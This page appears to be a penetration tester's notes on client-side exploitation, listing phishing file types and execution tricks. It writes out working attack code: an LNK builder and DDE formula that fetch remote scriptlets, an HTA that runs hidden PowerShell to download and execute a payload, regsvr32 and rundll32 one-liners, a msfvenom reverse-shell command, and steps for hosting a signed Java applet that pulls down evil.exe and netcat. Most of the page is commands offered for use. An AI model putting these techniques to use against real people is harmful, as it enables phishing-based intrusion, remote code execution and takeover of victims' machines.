---
title: Client Side
category: Exploitation
order: 1
---

> **Phishing**

* [My Phishing Tool](https://github.com/BinaryExile/Scripts/tree/master/Phishing)
* File Types:  .LNK, VBS, JS, URL, HTA, .EXE, ClickOnce, .scr
* Office Documents: OLE + executable file type, Macro docs, DDE

> **Execution Vectors**

{% highlight bash %}
#Using LNK Files
$object = new-object -COM WScript.Shell
$lnk = $object.CreateShortcut("MyLNK.lnk")
$lnk.WindowSyle = 7
$lnk.TargetPath = "%windir%\System32\regsvr32.exe"
$lnk.IconLocation = "C:\Program Files\Internet Explorer\iexplore.exe,1"
$lnk.Arguments = "/s /n /u /i:http://payload.com/malware.sct scrobj.dll"
$lnk.Save()

#Using DDE
=cscript|' /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http://goo.gl/ksuyDR '!A0

#HTA File
<script language="VBScript">
  Set objSWbemLocator = createObject("WbemScripting.SWbemLocator")
  Set objServices = objSWbemLocator.ConnectServer(".","\root\cimv2")
  set objProcess = objServices.Get("Win32_Process")
  objProcess.Create("powershell.exe -w hidden -command $wc = New-Object System.Net.Webclient;
  $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko');
  $wc.proxy = [System.Net.WebRequest]::DefaultWebProxy; $wc.proxy.credentials = [ System.Net.CredentialCache]::DefaultNetwrokCredentials; IEX ($wc.downloadstring('http://domain.com/payload'))")
  self.close
</script>

#COM Scriptlets
<scriptlet>
  <script language="VBScript">
    Set objSWbemLocator = CreateObject("WbemScripting.SWbemLocator")
    Set objServices = objSWbemLocator.ConnectServer(".", "\root\cimv2")
    Set objProcess = objServices.get("Win32_Process")
    objProcess.Create("calc.exe")
  </script>
</scriptlet>
  1. Regsvr32: regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll
  2. HTML Application: rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("var%20CADObject;CADObject%20=%20GetObject(\"script:http://domain/script.sct\");window.close()");
  3. VBScript command injection: cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 "script:http://domain/script.sct"
  4. .NET: [Microsoft.VisualBasic.Interaction]::GetObject(“script:http://domain.com/hi.sct”)

  
{% endhighlight %}

* [ClickOnce](https://blog.netspi.com/all-you-need-is-one-a-clickonce-love-story/)
* [ClickOnce - Powerpick](https://www.sixdub.net/?p=555)
* [msbuild](https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/)

> **Browser Exploit**

* Passive: Use https://extremetracking.com/?free to determine user agent
* Active: Call or Phishing
* Download exploit
* service apache2 start
* Generate new shellcode that's the same size or smaller:<br> <code> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f js_le -e generic/none </code>
* Pad as needed with <code> %u9090</code>

> **Signed Java App**

{% highlight bash %}
javac -source 1.7 -target 1.7 Java.java
echo “Permissions: all-permissions” > /root/manifest.txt
keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123
jar cvf Java.jar Java.class
cp Java.class SignedJava.jar /var/www/
echo '<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://10.11.0.5:80/evil.exe"></applet>' > /var/www/html/java.html
cp /usr/share/windows-binaries/nc.exe /var/www/nc.exe
{% endhighlight %}

* [java.java](https://raw.githubusercontent.com/BinaryExile/Scripts/master/exploits/client%20side/java.java)
